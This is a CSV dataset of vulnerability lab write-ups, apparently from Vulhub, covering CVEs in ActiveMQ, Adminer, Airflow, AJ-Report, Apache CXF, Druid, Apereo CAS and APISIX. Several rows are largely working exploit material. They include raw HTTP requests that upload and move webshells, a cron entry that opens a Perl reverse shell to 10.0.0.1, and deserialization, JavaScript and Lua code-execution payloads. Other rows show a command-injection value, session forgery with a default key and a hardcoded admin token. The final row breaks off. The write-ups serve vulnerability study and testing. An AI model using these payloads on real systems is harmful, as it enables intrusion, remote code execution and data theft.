Software,CVE,Title,Info,References
activemq,CVE-2022-41678,Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678),"Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

Apache ActiveMQ prior to 5.16.5, 5.17.3, there is a authenticated RCE exists in the Jolokia /api/jolokia.

References:
<https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
<https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/

Vulnerable Environment

Execute following command to start a Apache ActiveMQ 5.17.3:


docker compose up -d


After server is started, open the http://your-ip:8161/ and input username and password with admin and admin. Then you will see the index page of Apache ActiveMQ.

Exploit

Firstly, listing all avaiable MBeans in Apache ActiveMQ by /api/jolokia/list:


GET /api/jolokia/list HTTP/1.1
Host: localhost:8161
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Origin: http://localhost






There are 2 exploitable MBeans that are able to perform RCE in this list.

Method #1

The first one is using the org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean, a MBean provided by Log4j2.

Attacker can use this MBean to update the Log4j configuration and write logs to arbitrary directories.

I prepared a poc to reproduce the whole process:


python poc.py -u admin -p admin http://your-ip:8161




Webshell is written to /admin/shell.jsp successfully:



This method is limited by version of ActiveMQ, since Log4j2 was introduced in Apache ActiveMQ 5.17.0.

Method #2

The second one is using the jdk.management.jfr.FlightRecorderMXBean MBean.

FlightRecorder was introduced in OpenJDK 11, users are able to use FlightRecorderMXBean to create record and save it to a file. This feature is also can be used to write webshell.

Use poc to reproduce the whole process:


python poc.py -u admin -p admin --exploit jfr http://localhost:8161




Webshell is written to /admin/shelljfr.jsp successfully:
-------------------------------------------------------------------------------","https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/
http://localhost
http://your-ip:8161
http://localhost:8161"
activemq,CVE-2016-3088,ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088),"ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)

中文版本(Chinese version)

Environment setup

Enter following commands to build and run the vulnerability environment:


docker compose up -d


The environment listens to port 61616 and port 8161, of which 8161 is the web console port. This vulnerability appears in the web console.

Visit http://your-ip:8161/ to see the web page, indicating that the environment has been successfully run.

Background brief

ActiveMQ web console is divided into three applications, admin, api and fileserver, where admin is the administrator page, api is the interface, fileserver is the interface for storing files; admin and api need to log in before they can be used, fileserver does not need to log in.

fileserver is a RESTful API interface. We can read and write files stored in it through HTTP requests such as GET, PUT, and DELETE. The design purpose is to compensate for the defect that the message queue operation cannot transfer and store binary files, but later found that:

1. Its usage rate is not high
2. File operations are prone to vulnerabilities

Therefore, ActiveMQ has closed the fileserver application by default in 5.12.x~5.13.x (you can open it in conf/jetty.xml); after 5.14.0, the fileserver application is completely removed.

In the test process, you should pay attention to the version of ActiveMQ, prevent useless effort.

Vulnerability Details

This vulnerability appears in the Fileserver application, the vulnerability principle is actually very simple, that is, fileserver support to write files (but do not parse the JSP), while supporting the move file (MOVE request). So, we just need to write a file and then move it to any location by use a move request, causing arbitrary file write vulnerability.

Write files such as cron or ssh key

1. Write Webshell
2. Write files such as cron or ssh key
3. Write libraries and configuration files such as jar or jetty.xml

The advantage of writing webshell is convenient, but the fileserver don't parse jsp, admin and api both need to log in to access, so it is a bit futile; The advantage of writing cron or ssh key is to directly reverse Shell, it is convenient too, the disadvantage is that you need root privileges; write jar, a little trouble (requires jar back door), write xml configuration file, this method is more reliable, but there is a futile point: we need to know ActiveMQ absolute path.

Let we talk about the above several methods.

Write Webshell

As I said earlier, the Webshell needs to be written in the Admin or Api app, and both applications need to be logged in to access.

The default ActiveMQ account and password is admin. First, visit http://your-ip:8161/admin/test/systemProperties.jsp to view the absolute path of ActiveMQ:



Then upload Webshell:


PUT /fileserver/2.txt HTTP/1.1
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 120976

webshell...


Then move it to the API folder (/opt/activemq/webapps/api/s.jsp) in the Web directory:


MOVE /fileserver/2.txt HTTP/1.1
Destination: file:///opt/activemq/webapps/api/s.jsp
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0


Access Webshell (login required):



Write crontab, automate reverse shell

This is a relatively stable method. First upload the cron configuration file (note that the newline must be \n, not \r\n, otherwise the crontab execution will fail):


PUT /fileserver/1.txt HTTP/1.1
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 248

/1    * root /usr/bin/perl -e 'use Socket;$i=""10.0.0.1"";$p=21;socket(S,PFINET,SOCKSTREAM,getprotobyname(""tcp""));if(connect(S,sockaddrin($p,inetaton($i)))){open(STDIN,""&S"");open(STDOUT,""&S"");open(STDERR,""&S"");exec(""/bin/sh -i"");};'


Move it to /etc/cron.d/root:


MOVE /fileserver/1.txt HTTP/1.1
Destination: file:///etc/cron.d/root
Host: localhost:8161
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0


If both of the above requests return 204, the write is successful. Waiting for the reverse shell:



This method requires the ActiveMQ run as root, otherwise it will not be able to write to the cron file.

Write jetty.xml or jar

In theory we can override jetty.xml, remove the login restrictions for admin and api, and then write webshell.

In some cases, the owner of jetty.xml and jar is the user of the web container, so the success rate of writing crontab is higher.

Not tested yet.
-------------------------------------------------------------------------------",
activemq,CVE-2023-46604,Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604),"Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

OpenWire protocol is designed by ActiveMQ, to allow native access to ActiveMQ from a number of different languages and platforms. Apache ActiveMQ prior to 5.18.2 was affected by a deserialization vulnerability. This vulnerability may allow remote attackers with network access privileges to execute arbitrary shell commands by manipulating the serialized class types in the OpenWire protocol, leading to the instantiation of any class on the classpath of the agent.

References:
<https://activemq.apache.org/news/cve-2023-46604
<https://xz.aliyun.com/t/12929
<https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
<https://forum.butian.net/share/2566

Environment setup

ActiveMQ listens to following 2 ports:

| Default port | Default Condition                    |
|--------------|--------------------------------------|
| 8161 (web)   | Remote access requires configuration |
| 61616 (tcp)  | Remote access allowed                |

The deserialization issue exists in the port 61616.

Enter following commands to run a ActiveMQ 5.17.3 server:


docker compose up -d


Please access http://your-ip:8161 to confirm that the service has started successfully before exploitation, although we only need to use the port 61616 after that.

Exploit

You can quickly start an HTTP server in the folder where the poc.xml file is located using the Python3 http.server module:

shell
python3 -m http.server 6666


Then execute the poc.py:

shell
python3 poc.py target port http://ip of http server/poc.xml


You can check inside the ActiveMQ container using the following command:


docker exec cve-2023-46604-activemq-1 ls -l /tmp


If you see the output showing that touch /tmp/activeMQ-RCE-success has been executed successfully, then the exploit has worked.
-------------------------------------------------------------------------------","https://activemq.apache.org/news/cve-2023-46604
https://xz.aliyun.com/t/12929
https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
https://forum.butian.net/share/2566
http://ip"
activemq,CVE-2015-5254,ActiveMQ Deserialization Vulnerability (CVE-2015-5254),"ActiveMQ Deserialization Vulnerability (CVE-2015-5254)

中文版本(Chinese version)

Apache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.

Apache ActiveMQ version 5.x before the 5.13.0 security vulnerability, the vulnerability caused by the program does not limit the classes that can be serialized in the proxy. Remote attacker can make a special serialized Java Message Service (JMS) ObjectMessage objects exploit this vulnerability to execute arbitrary code.

Reference Links:
https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf

Vulnerability environment

Start the vulnerable environment:


docker compose up -d


After running the environment, it will establish two ports on port 61616 and 8161. Port 61616 is the working port, and messages are delivered on this port. Port 8161 is the webpage management page port. Access http://your-ip:8161, You can see the network management page, but this vulnerability does not require a network theoretically.

Exploit

The exploit process is as follows:

1. Generate serialized payload (u can using ysoserial)
2. send payload to port 61616
3. Access the web management page and read the serialization messages, then u can trigger vulnerability.

To exploit this environment we will use jmet (Java Message Exploitation Tool). First download the jar file of jmet, and create folder called external in the same directory (otherwise it may occur the error that the folder does not exist).

the jmet is to use ysoserial to generate Payload and send it (the jar comes with ysoserial, we don't no need to download it again), so we need to choose one that can be used in ysoserial as the gadget, such as ROME.

Execute:


java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y ""touch /tmp/success"" -Yp ROME your-ip 61616




At this point, a queue named event will be added to the target ActiveMQ.

You can visit http://your-ip:8161/admin/browse.jsp?JMSDestination=Event to see all messages in this queue.

(login / password: admin/admin):



Click this message to trigger the command execute, this time into the container docker compose exec activemq bash,

we can see /tmp/success has been successfully created, indicating exploit successful:



Replace the command with a reverse shell statement and reuse it:



It's worth noting that accessing messages through the web administration page and triggering the vulnerability requires administrator privileges. In the absence of password, we can induce administrator visit our link to trigger, or disguised as legitimate messages from other services need to wait for client access when triggered.
-------------------------------------------------------------------------------",https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf
adminer,CVE-2021-21311,Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311),"Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)

中文版本(Chinese version)

Adminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.

In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability on error page of Elasticsearch and ClickHouse. Users of Adminer versions bundling all drivers (e.g. adminer.php) are affected. This is fixed in version 4.7.9.

References:
<https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
<https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
<https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml

Vulnerable environment

Execute following command to start a PHP server with Adminer 4.7.8:


docker compose up -d


After the server is started, you can see the login page of Adminer at http://your-ip:8080.

Exploit

Select the ElasticSearch as the system field, then input example.com into the server field. Click the login button, you will see the 400 response from example.com:
-------------------------------------------------------------------------------","https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml"
adminer,CVE-2021-43008,Adminer Remote Arbitrary File Read (CVE-2021-43008),"Adminer Remote Arbitrary File Read (CVE-2021-43008)

中文版本(Chinese version)

Adminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.

Improper Access Control in Adminer versions 1.12.0 to 4.6.2 (fixed in version 4.6.3) allows an attacker to achieve Arbitrary File Read on the remote server by requesting the Adminer to connect to a remote MySQL database.

References:
<https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
<http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability

Vulnerable environment

Execute following command to start a PHP server with Adminer 4.6.2:


docker compose up -d


After the server is started, you can see the login page of Adminer at http://your-ip:8080.

Exploit

Start a roguo MySQL server through mysql-fake-server, then paste the fileread_/etc/passwd into username field:



Receive the request and the /etc/passwd has been written into current directory:
-------------------------------------------------------------------------------","https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability"
airflow,CVE-2020-17526,Apache Airflow Authentication Bypass (CVE-2020-17526),"Apache Airflow Authentication Bypass (CVE-2020-17526)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. Although authentication is not required by default, but the administration can specify the webserver.authenticate=True to enable it.

In the version prior to 1.10.13, Apache Airflow uses a default session secert key, which leads to impersonate arbitrary user when authentication is enabled.

References:
<https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
<https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise

Vulnerability Environment

Execute the following commands to start an airflow 1.10.10 server:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


After the server is started, browse the http://your-ip:8080 to see the login page of Apache Airflow. Yes, this server required authentication.

Exploit

Firstly, browse the login page and get a session string from Cookie:


curl -v http://localhost:8080/admin/airflow/login




Then, use flask-unsign to crack the session key:


flask-unsign -u -c [session from Cookie]




Bingo, we got the valid session key temporarykey. Then, use this key to generate a new session whose userid equals to 1:


flask-unsign -s --secret temporarykey -c ""{'userid': '1', 'fresh': False, 'permanent': True}""




Finally, use this generated session to log in successfully:
-------------------------------------------------------------------------------","https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise
http://localhost:8080/admin/airflow/login"
airflow,CVE-2020-11981,Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981),"Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, if the Redis broker (such as Redis or RabbitMQ) has been controlled by attacker, the attacker can execute arbitrary commands in the worker process.

Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.

References:
<https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
<https://github.com/apache/airflow/pull/9178

Vulnerability Environment

Execute the following commands to start an airflow 1.10.10 server:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


Exploit

For exploit this vulnerability, you have to get the write permission of the Celery broker, Redis. In Vulhub environment, Redis port 6379 is exposing on the Internet.

Through the Redis, you can add the evil task airflow.executors.celeryexecutor.executecommand to the queue to execute arbitrary commands.

Use this script exploitairflowcelery.py to execute the command touch /tmp/airflowcelerysuccess


pip install redis
python exploitairflowcelery.py [your-ip]


See the results on the logs:

bash
docker compose logs airflow-worker




As you can see, touch /tmp/airflowcelerysuccess has been successfully executed:


docker compose exec airflow-worker ls -l /tmp
-------------------------------------------------------------------------------","https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/apache/airflow/pull/9178"
airflow,CVE-2020-11978,Apache Airflow Command Injection in Example Dag (CVE-2020-11978),"Apache Airflow Command Injection in Example Dag (CVE-2020-11978)

中文版本(Chinese version)

Apache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, there is a command injection vulnerability in the example DAG exampletriggertarget_dag, which caused attackers to execute arbitrary commands in the worker process.

Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.

References:
<https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
<https://github.com/pberba/CVE-2020-11978

Vulnerability Environment

Execute the following commands to start airflow 1.10.10:

bash
Initialize the database
docker compose run airflow-init

Start service
docker compose up -d


Exploit

Visit http://your-ip:8080 to see the airflow management terminal, and turn on the exampletriggertarget_dag flag:



Click the ""triger"" button on the right, then input the configuration JSON with the crafted payload {""message"":""'\"";touch /tmp/airflowdagsuccess;#""}:



Wait a few seconds to see the execution of ""success"":



Go to the CeleryWorker container to see the result, touch /tmp/airflowdagsuccess has been successfully executed:


docker compose exec airflow-worker ls -l /tmp
-------------------------------------------------------------------------------","https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/pberba/CVE-2020-11978"
aj-report,Unknown,AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077),"AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077)

中文版本(Chinese version)

AJ-Report is an open source BI platform. In the version 1.4.0 and before, there is a authentication bypass issue and the attacker is able to perform arbitrary code execution through the issue.

References:
<https://xz.aliyun.com/t/14460
<https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

Vulnerable environment

Execute following command to start a AJ-Report server 1.4.0:


docker compose up -d


After the server is started, you can see the login page of AJ-Report through http://your-ip:9095.

Exploit

To exploit the issue by following request:


POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{""ParamName"":"""",""paramDesc"":"""",""paramType"":"""",""sampleItem"":""1"",""mandatory"":true,""requiredFlag"":1,""validationRules"":""function verification(data){a = new java.lang.ProcessBuilder(\""id\"").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}""}


As you can see, id command is executed successfully:
-------------------------------------------------------------------------------","https://xz.aliyun.com/t/14460
https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
apache-cxf,CVE-2024-28752,Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752),"Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752)

中文版本 (Chinese version)

Apache CXF is an open-source services framework that helps you build and develop services using frontend programming
APIs like JAX-WS and JAX-RS.

A SSRF vulnerability using the Aegis DataBinding in versions of Apache CXF before 4.0.4, 3.6.3 and 3.5.8 allows an
attacker to perform SSRF style attacks on webservices that take at least one parameter of any type. This vulnerability
specifically impacts services utilizing the Aegis DataBinding, while services using other data bindings, including the
default, are unaffected. Attackers can exploit this vulnerability to access internal resources by making the server send
requests to arbitrary URLs, potentially leading to information disclosure or further attacks against internal systems.

References:
<https://github.com/advisories/GHSA-qmgx-j96g-4428
<https://nvd.nist.gov/vuln/detail/CVE-2024-28752
<https://github.com/ReaJason/CVE-2024-28752

Environment Environment

Execute the following command to start a vulnerable Apache CXF webservice with Aegis DataBinding:


docker compose up -d


After the service starts, the vulnerable CXF webservice will be accessible at http://your-ip:8080/test?wsdl. The
service is configured to use Aegis DataBinding and accepts various parameter types, making it vulnerable to SSRF
attacks.

Vulnerability Reproduction

Send this request to the server:


POST /test HTTP/1.1
Host: your-ip:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close
-----kkkkkk123123213
Content-Disposition: form-data; name=""1""

<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:web=""http://service.namespace/""
   <soapenv:Header/
   <soapenv:Body
      <web:test
         <arg0
<count<xop:Include xmlns:xop=""http://www.w3.org/2004/08/xop/include"" href=""file:///etc/hosts""</xop:Include</count
</arg0
      </web:test
   </soapenv:Body
</soapenv:Envelope
-----kkkkkk123123213--
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-qmgx-j96g-4428
https://nvd.nist.gov/vuln/detail/CVE-2024-28752
https://github.com/ReaJason/CVE-2024-28752"
apache-druid,CVE-2021-25646,Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646),"Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646)

中文版本(Chinese version)

Apache Druid is an open source, distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency.

Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.

References:
<https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
<https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw

Vulnerable Environment

Execute following command to start an Apache Druid server 0.20.0:


docker compose up -d


After server is started, you can see the home page of Apache Druid on http://your-ip:8888.

Exploit

Send this request to the server:


POST /druid/indexer/v1/sampler HTTP/1.1
Host: your-ip:8888
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json

{
    ""type"":""index"",
    ""spec"":{
        ""ioConfig"":{
            ""type"":""index"",
            ""firehose"":{
                ""type"":""local"",
                ""baseDir"":""/etc"",
                ""filter"":""passwd""
            }
        },
        ""dataSchema"":{
            ""dataSource"":""test"",
            ""parser"":{
                ""parseSpec"":{
                ""format"":""javascript"",
                ""timestampSpec"":{

                },
                ""dimensionsSpec"":{

                },
                ""function"":""function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\""sh\"",\""-c\"",\""id\""]).getInputStream()).useDelimiter(\""\\A\"").next();return {timestamp:123123,test: a}}"",
                """":{
                    ""enabled"":""true""
                }
                }
            }
        }
    },
    ""samplerConfig"":{
        ""numRows"":10
    }
}


You will see the output of the id command:
-------------------------------------------------------------------------------","https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw"
apereo-cas,Unknown,Apereo CAS 4.1 Deserialization RCE Vulnerability,"Apereo CAS 4.1 Deserialization RCE Vulnerability

中文版本(Chinese version)

Apereo CAS is a enterprise single sign-on system. There is an issue in CAS’s attempts to deserialize objects via the Apache Commons Collections library, which cased a RCE vulnerability.

Reference:
https://apereo.github.io/2016/04/08/commonsvulndisc/

Environment Setup

Execute following commands to start an Apereo CAS 4.1.5：


docker compose up -d


After the Apereo CAS is started, visiting http://your-ip:8080/cas/login to see the login page.

Exploit

The out-of-the-box default configuration of Apereo CAS before 4.1.7, is using a default secret key changeit:

java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(""AES"", ""CBC"", ""PKCS7""));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias(""aes128"");
        bufferedBlockCipherBean.setKeyPassword(""changeit"");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...


We can try to use Apereo-CAS-Attack to generate a encrypted ysoserial's serialized object:


java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 ""touch /tmp/success""




Then, intercept and modify the http request from login action of /cas/login, put the payload into execution's value:


POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN




Congrats, touch /tmp/success has been successfully executed:
-------------------------------------------------------------------------------","https://apereo.github.io/2016/04/08/commonsvulndisc/
http://your-ip:8080
http://your-ip:8080/cas/login"
apisix,CVE-2020-13945,Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945),"Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945)

中文版本(Chinese version)

Apache APISIX is a dynamic, real-time, high-performance API gateway. Apache APISIX has a default built-in API token edd1c9f034335f136f87ad84b625c8f1 that can be used to access all the admin API, which leads to the remote LUA code execution through the script parameter added in the 2.x version.

References:
https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187

Vulnerability Environment

Execute following command to start a Apache APISIX server 2.11.0 (this vulnerability hasn't been fixed until newest version, might be not considered fixing by vendor):


docker compose up -d


After the server is started, you can see a default 404 page at http://your-ip:9080.

Vulnerability Reproduce

Add a new evil router rule to the APISIX through admin api with default token:


POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    ""uri"": ""/attack"",
""script"": ""local M = {} \n function M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.geturiargs()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M"",
    ""upstream"": {
        ""type"": ""roundrobin"",
        ""nodes"": {
            ""example.com:80"": 1
        }
    }
}




Then, use this evil router to execute arbitrary commands:


http://your-ip:9080/attack?cmd=id
-------------------------------------------------------------------------------","https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187"
apisix,CVE-2021-45232,Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232),"Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232)

中文版本(Chinese version)

Apache APISIX is a dynamic, real-time, high-performance API gateway, and Apache APISIX Dashboard is a easy to use frontend interface that is used to manage the Apache APISIX.

In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework droplet on the basis of framework gin, all APIs and authentication middleware are developed based on framework droplet. But there are 2 of these APIs /apisix/admin/migrate/export and /apisix/admin/migrate/import directly use the interface of framework gin which are able to bypass the authentication.

By using these 2 unauthenticated API endpoints, attackers can export and import arbitrary Apache APISIX configuration including routers, services, scripts etc, that leads to reqeust unexpected URL (SSRF) or execute arbitrary LUA scripts (RCE).

References:
https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp

Vulnerable environment

Execute following command to start a vulnerable Apache APISIX Dashboard 2.9:


docker compose up -d


Then you can access http://your-ip:9000/ to see the login page for Apache APISIX Dashboard.

Exploit

/apisix/admin/migrate/export and /apisix/admin/migrate/import are 2 unauthenticated API provided by Apache APISIX Dashboard, that are used to export and import configuration for Apache APISIX. So we can simplely import a craft configuration with evil router that contains user provided LUA script:



Noted that the last 4 bytes are CRC checksum of this file, so it's better to use a automatic POC to build and send the request, for example this POC.

After adding the evil router, you should send the request to Apache APISIX (difference from Apache APISIX Dashboard) to trigger the LUA script.

The Apache APISIX is listening on port 9080 in this environment:


GET /okw1Rh HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
